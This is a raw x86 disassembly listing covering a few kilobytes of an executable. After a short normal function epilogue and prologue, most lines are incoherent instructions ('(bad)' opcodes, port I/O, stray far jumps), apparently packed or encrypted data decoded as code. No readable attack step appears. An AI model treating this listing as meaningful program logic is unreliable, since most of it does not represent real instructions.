  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	mov    edi,0x7c6487da
  40ecf1:	int3   
  40ecf2:	jl     0x40ed70
  40ecf4:	inc    eax
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	outs   dx,DWORD PTR ds:[esi]
  40ecf9:	test   DWORD PTR [edx],0x35ef24a6
  40ecff:	push   es
  40ed00:	lods   eax,DWORD PTR ds:[esi]
  40ed01:	mov    eax,0x144bce4e
  40ed06:	out    dx,al
  40ed07:	sub    al,0x7f
  40ed09:	pusha  
  40ed0a:	out    0xca,al
  40ed0c:	inc    esp
  40ed0d:	adc    ah,BYTE PTR [edx-0x3bd52d8b]
  40ed13:	dec    eax
  40ed14:	jbe    0x40ed6e
  40ed16:	jle    0x40ed61
  40ed18:	mov    fs,WORD PTR [ebp-0x57fc8a35]
  40ed1e:	jmp    0x40ecd8
  40ed20:	push   ss
  40ed21:	xchg   edi,eax
  40ed22:	ret    0x648
  40ed25:	mov    al,0xe9
  40ed27:	cmp    bh,BYTE PTR [esi]
  40ed29:	loop   0x40eda5
  40ed2b:	sti    
  40ed2c:	dec    edx
  40ed2d:	pop    edi
  40ed2e:	call   0x9e16261e
  40ed33:	ins    BYTE PTR es:[edi],dx
  40ed34:	inc    esi
  40ed35:	mov    bl,0xdd
  40ed37:	es ins BYTE PTR es:[edi],dx
  40ed39:	and    cl,BYTE PTR [eax-0x6e]
  40ed3c:	call   0x1e2e080
  40ed41:	mov    ch,0x3b
  40ed43:	lock nop
  40ed45:	cmc    
  40ed46:	(bad)  
  40ed48:	mov    dh,BYTE PTR [eax]
  40ed4a:	sub    BYTE PTR [edx+ebp*1-0x56],ah
  40ed4e:	sti    
  40ed4f:	xchg   esp,eax
  40ed50:	fcom   DWORD PTR [edx]
  40ed52:	mov    dh,0xc8
  40ed54:	or     BYTE PTR gs:[edi],ch
  40ed57:	pushf  
  40ed58:	xchg   BYTE PTR [ebx-0x4e0bc200],dl
  40ed5e:	push   DWORD PTR [eax]
  40ed60:	inc    ebx
  40ed61:	sbb    BYTE PTR [ecx],ah
  40ed63:	in     al,0x38
  40ed65:	add    DWORD PTR [esi+0x7539b3d0],edx
  40ed6b:	xchg   ecx,eax
  40ed6c:	cmp    edx,ebx
  40ed6e:	movaps xmm0,XMMWORD PTR [ecx]
  40ed71:	(bad)  
  40ed72:	add    al,0x39
  40ed74:	xchg   edx,eax
  40ed75:	stc    
  40ed76:	sbb    ah,BYTE PTR [ecx]
  40ed78:	scas   al,BYTE PTR es:[edi]
  40ed79:	daa    
  40ed7a:	add    al,0xc
  40ed7c:	(bad)  
  40ed7d:	aas    
  40ed7e:	loopne 0x40ed1a
  40ed80:	xor    eax,0xc1998cfc
  40ed85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed86:	pop    ebx
  40ed87:	mov    esi,0x8eef4a8
  40ed8c:	rol    DWORD PTR [edx],cl
  40ed8e:	jnp    0x40ed67
  40ed90:	push   esp
  40ed91:	mov    ds:0xac46aa13,al
  40ed96:	mov    esp,0xdba4ab1f
  40ed9b:	mov    edi,0x2f175a12
  40eda0:	and    eax,0xf379eca8
  40eda5:	dec    ebp
  40eda6:	bound  ebp,QWORD PTR ds:0x92070bdc
  40edac:	sbb    al,0x24
  40edae:	sti    
  40edaf:	mov    esi,0x55de28d8
  40edb4:	shl    eax,0xa
  40edb7:	scas   al,BYTE PTR es:[edi]
  40edb8:	xor    al,BYTE PTR [esi-0x25]
  40edbb:	outs   dx,DWORD PTR ds:[esi]
  40edbc:	and    al,BYTE PTR [esi+0x54]
  40edbf:	dec    ebx
  40edc0:	push   ebx
  40edc1:	pusha  
  40edc2:	inc    ecx
  40edc3:	dec    ecx
  40edc4:	push   esi
  40edc5:	mov    al,0x10
  40edc7:	dec    edi
  40edc8:	cld    
  40edc9:	fs ret 
  40edcb:	inc    ebp
  40edcc:	fwait
  40edcd:	sahf   
  40edce:	jne    0x40ed93
  40edd0:	scas   eax,DWORD PTR es:[edi]
  40edd1:	cld    
  40edd2:	pop    esi
  40edd3:	cmp    al,0xb4
  40edd5:	popa   
  40edd6:	push   DWORD PTR [esi]
  40edd8:	fist   DWORD PTR [edi+0x66]
  40eddb:	or     ah,al
  40eddd:	push   0x65e9cdf6
  40ede2:	adc    ah,BYTE PTR [edi+ecx*8]
  40ede5:	jl     0x40edde
  40ede7:	(bad)  
  40ede8:	aam    0xe3
  40edea:	push   esi
  40edeb:	pop    esp
  40edec:	dec    eax
  40eded:	jmp    0xeaf05e1b
  40edf2:	sub    esi,DWORD PTR cs:[edi]
  40edf5:	jge    0x40edae
  40edf7:	pop    ecx
  40edf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf9:	sub    dl,dh
  40edfb:	into   
  40edfc:	popa   
  40edfd:	xchg   DWORD PTR [ebx],ecx
  40edff:	fcomip st,st(0)
  40ee01:	dec    bp
  40ee03:	xchg   ecx,eax
  40ee04:	jbe    0x40ee7f
  40ee06:	scas   al,BYTE PTR es:[edi]
  40ee07:	ins    BYTE PTR es:[edi],dx
  40ee08:	pop    ss
  40ee09:	scas   al,BYTE PTR es:[edi]
  40ee0a:	sub    ah,ch
  40ee0c:	pop    dx
  40ee0e:	pop    esp
  40ee0f:	gs stos BYTE PTR es:[edi],al
  40ee11:	jno    0x40ee3b
  40ee13:	pushf  
  40ee14:	sub    ch,BYTE PTR [esi+0x4b40a2a5]
  40ee1a:	test   eax,0x9ec41d00
  40ee1f:	aas    
  40ee20:	mov    dl,0xdc
  40ee22:	dec    ebx
  40ee23:	int3   
  40ee24:	out    dx,eax
  40ee25:	or     BYTE PTR [esi],cl
  40ee27:	in     al,dx
  40ee28:	mov    ds:0xb03ea463,eax
  40ee2d:	aas    
  40ee2e:	xor    ch,ah
  40ee30:	idiv   BYTE PTR [ebp-0x80]
  40ee33:	test   al,0x5b
  40ee35:	adc    DWORD PTR [edx-0x1a5249db],edx
  40ee3b:	dec    esp
  40ee3c:	lea    esp,[edi]
  40ee3e:	mov    ?,WORD PTR [ecx-0xd6dc7e2]
  40ee44:	jne    0x40ee6d
  40ee46:	test   BYTE PTR [eax+0x56],ah
  40ee49:	stos   BYTE PTR es:[edi],al
  40ee4a:	js     0x40ee49
  40ee4c:	xchg   edx,eax
  40ee4d:	mov    al,0xd8
  40ee4f:	dec    esi
  40ee50:	push   0x4b
  40ee52:	xor    al,0xe
  40ee54:	(bad)  
  40ee55:	out    0x97,eax
  40ee57:	add    edx,ebx
  40ee59:	add    bh,BYTE PTR [esp+esi*2]
  40ee5c:	sbb    cl,BYTE PTR [edi]
  40ee5e:	das    
  40ee5f:	push   0x4b1136c5
  40ee64:	addr16 pop es
  40ee66:	add    BYTE PTR [edi+0x39f8711],dl
  40ee6c:	mov    ebp,0x5f60d63c
  40ee71:	mov    cl,ah
  40ee73:	scas   eax,DWORD PTR es:[edi]
  40ee74:	pop    esi
  40ee75:	ins    DWORD PTR es:[edi],dx
  40ee76:	sbb    cl,dl
  40ee78:	sub    ecx,DWORD PTR [ecx-0x40]
  40ee7b:	jbe    0x40eeeb
  40ee7d:	les    edi,FWORD PTR [ecx-0xebf949f]
  40ee83:	jmp    0x13033639
  40ee88:	punpcklwd mm3,mm4
  40ee8b:	xchg   edx,eax
  40ee8c:	iret   
  40ee8d:	and    ah,bh
  40ee8f:	xlat   BYTE PTR ds:[ebx]
  40ee90:	mov    eax,0xf1e81108
  40ee95:	cmp    al,0x9b
  40ee97:	outs   dx,DWORD PTR ds:[esi]
  40ee98:	fidivr DWORD PTR [ebp+edi*4-0x4c]
  40ee9c:	pop    esp
  40ee9d:	jnp    0x40ee38
  40ee9f:	cmp    al,0xec
  40eea1:	cld    
  40eea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea3:	xor    ebx,edx
  40eea5:	out    dx,al
  40eea6:	jns    0x40ee9c
  40eea8:	inc    edx
  40eea9:	(bad)  
  40eeaa:	gs mov ebx,0xf647f52d
  40eeb0:	fucomp st(3)
  40eeb2:	stos   DWORD PTR es:[edi],eax
  40eeb3:	mov    edx,0xf594f172
  40eeb8:	sub    ebx,ebp
  40eeba:	shl    cl,0x7e
  40eebd:	(bad)  
  40eebe:	jbe    0x40eeee
  40eec0:	pop    edx
  40eec1:	sbb    DWORD PTR [ecx],ecx
  40eec3:	cmp    eax,DWORD PTR [edi+0x63]
  40eec6:	xchg   ebx,eax
  40eec7:	jmp    0x699b:0x415811b3
  40eece:	add    eax,0x63734951
  40eed3:	sub    al,0xa7
  40eed5:	(bad)  
  40eed6:	out    dx,eax
  40eed7:	jne    0x40ef2c
  40eed9:	sbb    BYTE PTR [esi],0x66
  40eedc:	mov    bh,0x7e
  40eede:	xor    eax,0xe0b05571
  40eee3:	icebp  
  40eee4:	pop    ss
  40eee5:	mov    eax,0x8314393e
  40eeea:	sub    eax,0xc12d5c45
  40eeef:	ret    0x16d0
  40eef2:	lds    esi,FWORD PTR [edx+0xb]
  40eef5:	xchg   BYTE PTR [edi+0x6ff16764],ch
  40eefb:	aaa    
  40eefc:	ss mov cl,0x1e
  40eeff:	cmp    DWORD PTR ds:0x39fc2c5c,ebx
  40ef05:	pop    esp
  40ef06:	lahf   
  40ef07:	lods   eax,DWORD PTR ds:[esi]
  40ef08:	test   al,0x7b
  40ef0a:	jl     0x40ee96
  40ef0c:	(bad)  [eax]
  40ef0e:	sbb    al,BYTE PTR [edx]
  40ef10:	cmp    eax,0x8f75f3e8
  40ef15:	inc    ebp
  40ef16:	ins    DWORD PTR es:[edi],dx
  40ef17:	jg     0x40ef88
  40ef19:	and    BYTE PTR [edx-0x397ff776],ah
  40ef1f:	ficom  DWORD PTR gs:0x5031f9ab
  40ef26:	stc    
  40ef27:	cmp    DWORD PTR [ebx+0x1b8c19e6],esi
  40ef2d:	mov    cl,0xd8
  40ef2f:	test   DWORD PTR [ebx+ecx*8],0xa84a1ea5
  40ef36:	scas   al,BYTE PTR es:[edi]
  40ef37:	popa   
  40ef38:	mov    edi,0x1c631a35
  40ef3d:	mov    WORD PTR [ebx],cs
  40ef3f:	ja     0x40efaf
  40ef41:	sbb    dl,dh
  40ef43:	dec    esi
  40ef44:	dec    esp
  40ef45:	xor    ebx,ecx
  40ef47:	or     ah,BYTE PTR [edx+0x65]
  40ef4a:	rol    DWORD PTR [ebp+0x5e],cl
  40ef4d:	fsub   st,st(6)
  40ef4f:	addr16 mov al,0xd6
  40ef52:	sub    DWORD PTR [esi+0x4089f87b],eax
  40ef58:	dec    edi
  40ef59:	shl    esp,0x73
  40ef5c:	jmp    0x391c:0x3c258ce0
  40ef63:	retf   
  40ef64:	in     eax,dx
  40ef65:	cmp    cl,bl
  40ef67:	inc    ebx
  40ef68:	sbb    ah,BYTE PTR [edx-0xf613ad6]
  40ef6e:	lock fist WORD PTR [ecx]
  40ef71:	std    
  40ef72:	and    eax,ecx
  40ef74:	jno    0x40ef66
  40ef76:	mov    bh,0x8c
  40ef78:	sbb    BYTE PTR [ecx-0xb],bl
  40ef7b:	add    eax,0x9af9ffab
  40ef81:	cld    
  40ef82:	dec    ebx
  40ef83:	mov    esi,0xa826a591
  40ef88:	movnti DWORD PTR [edx],esp
  40ef8b:	add    eax,0x421c4795
  40ef90:	cmc    
  40ef91:	(bad)
  40ef94:	pop    ss
  40ef95:	into   
  40ef96:	xor    al,0x16
  40ef98:	xchg   esi,eax
  40ef99:	jns    0x40ef35
  40ef9b:	out    dx,al
  40ef9c:	inc    ecx
  40ef9d:	pop    edi
  40ef9e:	jle    0x40ef39
  40efa0:	arpl   WORD PTR [edi+0x1],si
  40efa3:	push   esi
  40efa4:	shl    DWORD PTR [esi+0x3e],1
  40efa7:	pop    edi
  40efa8:	enter  0x464a,0xe3
  40efac:	inc    esp
  40efad:	sbb    eax,0x839657ca
  40efb2:	hlt    
  40efb3:	lahf   
  40efb4:	addr16 out dx,eax
  40efb6:	mov    ds:0xd4adcd62,al
  40efbb:	mov    bh,0x2e
  40efbd:	inc    ecx
  40efbe:	fld    QWORD PTR [esi+esi*8-0x37]
  40efc2:	aam    0x62
  40efc4:	sbb    eax,0x326ad2cc
  40efc9:	and    al,0x8d
  40efcb:	int    0xd
  40efcd:	fs aas 
  40efcf:	adc    bh,BYTE PTR [bp+si-0x5e]
  40efd3:	outs   dx,DWORD PTR ds:[esi]
  40efd4:	aam    0xe2
  40efd6:	data16 (bad) 
  40efd8:	scas   al,BYTE PTR es:[edi]
  40efd9:	jnp    0x40ef6c
  40efdb:	ror    BYTE PTR [ecx+0x4f],0xd6
  40efdf:	push   cs
  40efe0:	stos   BYTE PTR es:[edi],al
  40efe1:	dec    edx
  40efe2:	or     DWORD PTR [esi],0x8a6fd2a
  40efe8:	in     eax,0x88
  40efea:	sub    ebx,DWORD PTR [esi+0x28c5d16e]
  40eff0:	addr16 call 0xebe7:0xefb0ab75
  40eff8:	xchg   edx,eax
  40eff9:	not    DWORD PTR [edx-0x1d]
  40effc:	jle    0x40efe1
  40effe:	fs dec eax
  40f000:	cmp    BYTE PTR [ebx-0x337f8cb5],0x38
  40f007:	cmp    ebx,DWORD PTR [esi]
  40f009:	push   ecx
  40f00a:	and    eax,0x833f2189
  40f00f:	sbb    eax,0x22b09faf
  40f014:	mov    esp,0xed34d082
  40f019:	fisubr WORD PTR [esi-0x6c]
  40f01c:	call   0xa0534f59
  40f021:	sub    BYTE PTR [edx+0x5395684d],ch
  40f027:	and    al,0xc4
  40f029:	not    DWORD PTR [ecx]
  40f02b:	or     eax,0xe759e1d2
  40f030:	pop    ecx
  40f031:	pop    ebp
  40f032:	emms   
  40f034:	(bad)  
  40f035:	in     al,0x44
  40f037:	int3   
  40f038:	mov    edi,0x462d06c2
  40f03d:	mov    WORD PTR [esi],es
  40f03f:	lods   al,BYTE PTR ds:[esi]
  40f040:	mov    dl,0x63
  40f042:	fld    QWORD PTR [ecx-0x10]
  40f045:	jno    0x40efd8
  40f047:	test   eax,0x9c1f5454
  40f04c:	xor    edi,DWORD PTR [edi+0x46d461e8]
  40f052:	clc    
  40f053:	mov    dl,0xcb
  40f055:	add    DWORD PTR [ecx+eiz*1-0xe],0xe32e5c00
  40f05d:	fistp  WORD PTR [eax-0x44]
  40f060:	fdivr  QWORD PTR [edi]
  40f062:	imul   edx,ecx,0xeace9e85
  40f068:	pop    ecx
  40f069:	or     bl,BYTE PTR [ebx-0xb066b4b]
  40f06f:	mov    ebp,0xcfcbbcfa
  40f074:	and    BYTE PTR [ecx],cl
  40f076:	lahf   
  40f077:	cld    
  40f078:	(bad)  
  40f079:	mov    edx,0xe6dbaee3
  40f07e:	xchg   ecx,eax
  40f07f:	inc    ecx
  40f080:	dec    edi
  40f081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f082:	inc    esp
  40f083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f084:	jecxz  0x40f041
  40f086:	pop    esi
  40f087:	ds mov dl,0xe7
  40f08a:	xchg   esi,eax
  40f08b:	rcr    BYTE PTR [ebx-0x2dbddc7e],cl
  40f091:	jb     0x40f072
  40f093:	push   ebx
  40f094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f095:	mov    edx,0x94e8066c
  40f09a:	aas    
  40f09b:	sbb    eax,0xcdc0ce
  40f0a0:	nop
  40f0a1:	cli    
  40f0a2:	sahf   
  40f0a3:	sub    dl,BYTE PTR [esi-0x5d]
  40f0a6:	data16 adc bh,bh
  40f0a9:	xor    al,0x46
  40f0ab:	mov    edx,ebx
  40f0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ae:	lods   eax,DWORD PTR ds:[esi]
  40f0af:	ins    BYTE PTR es:[edi],dx
  40f0b0:	inc    edx
  40f0b1:	mov    edx,0xe5156b51
  40f0b6:	mov    WORD PTR [ebx+0x9],?
  40f0b9:	(bad)  
  40f0ba:	stos   BYTE PTR es:[edi],al
  40f0bb:	outs   dx,DWORD PTR ds:[esi]
  40f0bc:	fldcw  WORD PTR [eax]
  40f0be:	push   es
  40f0bf:	push   ebp
  40f0c0:	xor    edi,DWORD PTR [eax-0x42]
  40f0c3:	inc    esp
  40f0c4:	cs mov bl,0xde
  40f0c7:	mov    cl,0xa1
  40f0c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ca:	pop    esp
  40f0cb:	cmp    BYTE PTR ds:0x711c47cd,ah
  40f0d1:	dec    ebx
  40f0d2:	sub    edx,DWORD PTR [eax+0x2]
  40f0d5:	iret   
  40f0d6:	mov    ebp,0x8c94ec94
  40f0db:	clc    
  40f0dc:	pop    ds
  40f0dd:	cmp    eax,0xd3353f6a
  40f0e2:	and    BYTE PTR [edi],0x1a
  40f0e5:	iret   
  40f0e6:	xor    DWORD PTR [ecx+0x7d9b5c63],ebx
  40f0ec:	xor    ebx,esp
  40f0ee:	inc    edx
  40f0ef:	adc    eax,0x3c482933
  40f0f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f5:	sbb    eax,0x78167570
  40f0fa:	int    0xa9
  40f0fc:	adc    edi,edx
  40f0fe:	in     eax,dx
  40f0ff:	xchg   esi,eax
  40f100:	xchg   ebp,eax
  40f101:	leave  
  40f102:	pop    es
  40f103:	imul   esi,DWORD PTR [esi+0x33],0x344676cb
  40f10a:	xor    al,0x59
  40f10c:	bound  ebp,QWORD PTR [ecx]
  40f10e:	mov    ebx,0x27fd7d44
  40f113:	shr    DWORD PTR [esi],cl
  40f115:	dec    edi
  40f116:	rcr    DWORD PTR [ebx-0x25b42740],cl
  40f11c:	(bad)  
  40f11d:	fwait
  40f11e:	test   BYTE PTR [eax],dh
  40f120:	xor    BYTE PTR ds:0xbb2c9f03,ch
  40f126:	pop    ebp
  40f127:	fadd   QWORD PTR [eax+0x48]
  40f12a:	in     eax,0x2c
  40f12c:	add    eax,0x8fafae0e
  40f131:	mul    DWORD PTR [ebp-0x3e]
  40f134:	and    dh,ah
  40f136:	dec    esp
  40f137:	loope  0x40f0fa
  40f139:	aam    0x44
  40f13b:	jno    0x40f11b
  40f13d:	dec    eax
  40f13e:	push   edx
  40f13f:	les    edi,FWORD PTR [ecx+0xd]
  40f142:	pop    ss
  40f143:	addr16 pop ds
  40f145:	xchg   edi,eax
  40f146:	in     eax,0x4f
  40f148:	mov    ch,0x1
  40f14a:	mov    BYTE PTR [edi+0x40],dh
  40f14d:	xlat   BYTE PTR ds:[ebx]
  40f14e:	ret    0x36ce
  40f151:	ins    BYTE PTR es:[edi],dx
  40f152:	mul    DWORD PTR ds:0x890ebc41
  40f158:	cdq    
  40f159:	and    edx,esi
  40f15b:	imul   eax,DWORD PTR [ebx-0x4ce3e45d],0x5d3d4a5c
  40f165:	das    
  40f166:	lods   eax,DWORD PTR ds:[esi]
  40f167:	push   0xffffff85
  40f169:	sti    
  40f16a:	in     al,dx
  40f16b:	div    BYTE PTR [edx]
  40f16d:	repz sub ebx,DWORD PTR [ebp-0x3a55dec7]
  40f174:	xchg   esp,eax
  40f175:	adc    ebx,edx
  40f177:	lds    ecx,FWORD PTR [ebx]
  40f179:	mov    edi,0x73f3cd80
  40f17e:	aad    0x61
  40f180:	push   edx
  40f181:	repz lock ss mov ecx,0xe4521b3
  40f189:	lea    eax,[edx]
  40f18b:	adc    al,0x47
  40f18d:	xchg   edx,eax
  40f18e:	sub    al,0x85
  40f190:	rcpps  xmm4,xmm5
  40f193:	push   es
  40f194:	cmp    al,0xf8
  40f196:	inc    BYTE PTR [ebx+0x59]
  40f199:	ror    esp,cl
  40f19b:	inc    edx
  40f19c:	in     eax,dx
  40f19d:	dec    ecx
  40f19e:	adc    ch,ch
  40f1a0:	or     eax,0xab2991ce
  40f1a5:	sbb    BYTE PTR [ebx],ah
  40f1a7:	inc    edi
  40f1a8:	in     eax,0x12
  40f1aa:	fdiv   DWORD PTR [ebp-0x5]
  40f1ad:	gs in  al,0xb3
  40f1b0:	add    eax,0x1b8ca828
  40f1b5:	hlt    
  40f1b6:	and    DWORD PTR [bx+si-0xaa7],ebx
  40f1bb:	sub    BYTE PTR [edx-0x7b],cl
  40f1be:	je     0x40f141
  40f1c0:	cmp    DWORD PTR [ecx],0xdb3cc7fc
  40f1c6:	pop    esp
  40f1c7:	out    dx,eax
  40f1c8:	cmp    ah,BYTE PTR [esi+0x466f671f]
  40f1ce:	fldcw  WORD PTR [edi+0x2b9c795f]
  40f1d4:	add    eax,0xc649ed3f
  40f1d9:	les    esi,FWORD PTR [ecx+0x28]
  40f1dc:	das    
  40f1dd:	mov    ebp,0x52998e36
  40f1e2:	fadd   QWORD PTR [esi+edx*1]
  40f1e5:	pop    edx
  40f1e6:	push   ebp
  40f1e7:	sar    BYTE PTR [ebx],cl
  40f1e9:	mov    esi,0x5a9685f7
  40f1ee:	inc    esi
  40f1ef:	mov    al,0x3a
  40f1f1:	jne    0x40f1dc
  40f1f3:	rcr    BYTE PTR [esi],0x31
  40f1f6:	mov    bl,0x76
  40f1f8:	outs   dx,DWORD PTR ds:[esi]
  40f1f9:	sbb    eax,0xabeaedf1
  40f1fe:	lds    edx,FWORD PTR [ebx-0x5f2d557]
  40f204:	inc    esp
  40f205:	in     al,0x99
  40f207:	pop    edx
  40f208:	jbe    0x40f216
  40f20a:	xchg   esp,eax
  40f20b:	mov    edi,0x1b87fc0
  40f210:	lldt   WORD PTR [edi+esi*2+0x1e78a75c]
  40f218:	rcl    BYTE PTR [ebx+edi*2+0x36],1
  40f21c:	ja     0x40f1f0
  40f21e:	pop    ecx
  40f21f:	in     al,0x27
  40f221:	sbb    al,BYTE PTR [ebx-0x640b7a3c]
  40f227:	add    edi,ebp
  40f229:	lods   al,BYTE PTR ds:[esi]
  40f22a:	push   esi
  40f22b:	jmp    0x40f224
  40f22d:	push   0xf0238e21
  40f232:	sub    al,0x5f
  40f234:	mov    DWORD PTR [eax+ecx*1+0x56a1b95c],edx
  40f23b:	push   0xfffffffd
  40f23d:	imul   esi,DWORD PTR [esi+0x4e9305f5],0x2d
  40f244:	and    BYTE PTR [eax],0x9b
  40f247:	mov    al,ds:0x876893a0
  40f24c:	adc    BYTE PTR [ecx],bh
  40f24e:	std    
  40f24f:	sbb    DWORD PTR [esi-0x2aa6149b],esp
  40f255:	jecxz  0x40f29b
  40f257:	pop    edx
  40f258:	jae    0x40f23e
  40f25a:	push   esp
  40f25b:	mov    WORD PTR [eax+edx*8+0x0],ss
  40f25f:	mov    edi,0x34abf510
  40f264:	mov    ebx,DWORD PTR [ebx]
  40f266:	add    DWORD PTR [ecx-0x36986118],0xed4d0a77
  40f270:	fimul  DWORD PTR ds:[edx-0xeff47dc]
  40f277:	mov    edx,0xf0687cb6
  40f27c:	outs   dx,BYTE PTR ds:[esi]
  40f27d:	cmp    bh,al
  40f27f:	mov    dh,dh
  40f281:	and    edi,DWORD PTR [eax+ecx*1+0xf94cc79]
  40f288:	sbb    eax,DWORD PTR [ebp+0x9bed48f]
  40f28e:	pop    ecx
  40f28f:	push   ss
  40f290:	pusha  
  40f291:	inc    eax
  40f292:	in     al,0x79
  40f294:	xchg   ebx,eax
  40f295:	es sbb eax,0xc4a95f8e
  40f29b:	fadd   DWORD PTR [eax+0x1c]
  40f29e:	lock jecxz 0x40f2a0
  40f2a1:	jno    0x40f2bb
  40f2a3:	mov    ecx,0x6fb4f13d
  40f2a8:	fmul   DWORD PTR [edi+0x30af50ea]
  40f2ae:	push   edx
  40f2af:	inc    edx
  40f2b0:	push   ecx
  40f2b1:	lods   eax,DWORD PTR ds:[esi]
  40f2b2:	ins    DWORD PTR es:[edi],dx
  40f2b3:	aas    
  40f2b4:	shr    DWORD PTR [edi+0x33428e40],cl
  40f2ba:	mov    ds:0x76a39716,eax
  40f2bf:	loop   0x40f2ef
  40f2c1:	pop    edx
  40f2c2:	ja     0x40f307
  40f2c4:	nop
  40f2c5:	inc    edx
  40f2c6:	xor    ebx,DWORD PTR [ebx]
  40f2c8:	jmp    DWORD PTR [ecx]
  40f2ca:	cld    
  40f2cb:	pop    esp
  40f2cc:	sar    DWORD PTR [ebx+0x17],cl
  40f2cf:	and    eax,edx
  40f2d1:	xchg   ecx,eax
  40f2d2:	data16 fs addr16 in al,dx
  40f2d6:	int    0x41
  40f2d8:	xlat   BYTE PTR ds:[ebx]
  40f2d9:	std    
  40f2da:	aaa    
  40f2db:	dec    ebp
  40f2dc:	inc    edx
  40f2dd:	inc    esp
  40f2de:	dec    ebp
  40f2df:	sbb    ebx,0x183e3f52
  40f2e5:	popf   
  40f2e6:	dec    eax
  40f2e7:	adc    al,0xf5
  40f2e9:	fidivr WORD PTR [ecx-0x58]
  40f2ec:	or     esp,DWORD PTR [ebx]
  40f2ee:	mov    dl,BYTE PTR [bx]
  40f2f1:	inc    ebp
  40f2f2:	popa   
  40f2f3:	sub    al,0x47
  40f2f5:	mov    bl,0x53
  40f2f7:	nop
  40f2f8:	mov    al,ds:0xf26fc6a
  40f2fd:	into   
  40f2fe:	xchg   ebx,eax
  40f2ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f300:	cli    
  40f301:	imul   esp,DWORD PTR [edx+0x7225aab7],0x5e1cfc50
  40f30b:	add    DWORD PTR [ebp+0x35c4e9fc],eax
  40f311:	jne    0x40f2d1
  40f313:	aaa    
  40f314:	and    al,bh
  40f316:	(bad)
  40f319:	stc    
  40f31a:	aaa    
  40f31b:	xchg   esp,eax
  40f31c:	popf   
  40f31d:	cs pop edi
  40f31f:	out    0xf3,al
  40f321:	push   es
  40f322:	lock adc dh,BYTE PTR [ebp-0x4d]
  40f326:	pop    esi
  40f327:	arpl   WORD PTR [edi],di
  40f329:	xchg   edx,eax
  40f32a:	nop
  40f32b:	repnz sub BYTE PTR [edi],bh
  40f32e:	xlat   BYTE PTR cs:[ebx]
  40f330:	jl     0x40f36b
  40f332:	lock sub al,BYTE PTR [esi+0x4b]
  40f336:	(bad)  
  40f337:	mov    ah,0x9d
  40f339:	jns    0x40f31d
  40f33b:	ret    0x898f
  40f33e:	dec    edx
  40f33f:	aam    0xb8
  40f341:	mov    ecx,0xe9229b89
  40f346:	cmp    al,0x4
  40f348:	popa   
  40f349:	cmp    DWORD PTR [esi],ebp
  40f34b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f34d:	aam    0xc7
  40f34f:	dec    esi
  40f350:	adc    eax,0x49707131
  40f355:	jae    0x40f333
  40f357:	pop    ss
  40f358:	add    al,0x5e
  40f35a:	lods   al,BYTE PTR ds:[esi]
  40f35b:	fwait
  40f35c:	ins    BYTE PTR es:[edi],dx
  40f35d:	in     eax,0x91
  40f35f:	aam    0xf7
  40f361:	adc    edi,edx
  40f363:	pop    ecx
  40f364:	pop    ebp
  40f365:	outs   dx,BYTE PTR ds:[esi]
  40f366:	fidiv  WORD PTR [esi]
  40f368:	(bad)  
  40f369:	or     esp,esp
  40f36b:	jns    0x40f3c2
  40f36d:	fst    DWORD PTR [esi+ebx*4]
  40f370:	and    DWORD PTR [ecx],ebp
  40f372:	mov    ecx,0x29ea1419
  40f377:	pusha  
  40f378:	mov    ds:0xc9d7d8c4,al
  40f37d:	pop    edi
  40f37e:	out    0x23,eax
  40f380:	in     al,dx
  40f381:	xchg   ebp,eax
  40f382:	pop    es
  40f383:	jmp    0x40f3ce
  40f385:	(bad)
  40f388:	add    dh,BYTE PTR [esi+0x2679caa1]
  40f38e:	mov    fs,WORD PTR [esi-0x56]
  40f391:	fwait
  40f392:	and    BYTE PTR [ebp-0x28],bl
  40f395:	xchg   ebp,eax
  40f396:	adc    BYTE PTR [ebp-0x4429637f],0x4c
  40f39d:	fdiv   DWORD PTR [ebp+0x56]
  40f3a0:	mov    ah,0x27
  40f3a2:	xchg   ebp,eax
  40f3a3:	ret    0x67c6
  40f3a6:	xchg   cx,ax
  40f3a8:	jmp    0x8891923c
  40f3ad:	dec    ebp
  40f3ae:	test   BYTE PTR [esi-0x5b],dh
  40f3b1:	ds xor eax,0xc4d8a4a
  40f3b7:	pop    ds
  40f3b8:	inc    ecx
  40f3b9:	mov    ah,0xa1
  40f3bb:	sbb    al,0xbf
  40f3bd:	fild   DWORD PTR [ebp+edi*4-0x407ff944]
  40f3c4:	seta   BYTE PTR [edx-0x11]
  40f3c8:	inc    edi
  40f3c9:	cdq    
  40f3ca:	jmp    0x2c3:0x1c483739
  40f3d1:	clc    
  40f3d2:	xor    DWORD PTR [ecx-0x863e020],ecx
  40f3d8:	inc    ebx
  40f3d9:	jmp    0x4ef0:0x35969c8
  40f3e0:	out    dx,eax
  40f3e1:	(bad)  
  40f3e2:	push   edx
  40f3e3:	cmc    
  40f3e4:	inc    ebp
  40f3e5:	inc    esp
  40f3e6:	mov    BYTE PTR [ecx+0x53],ah
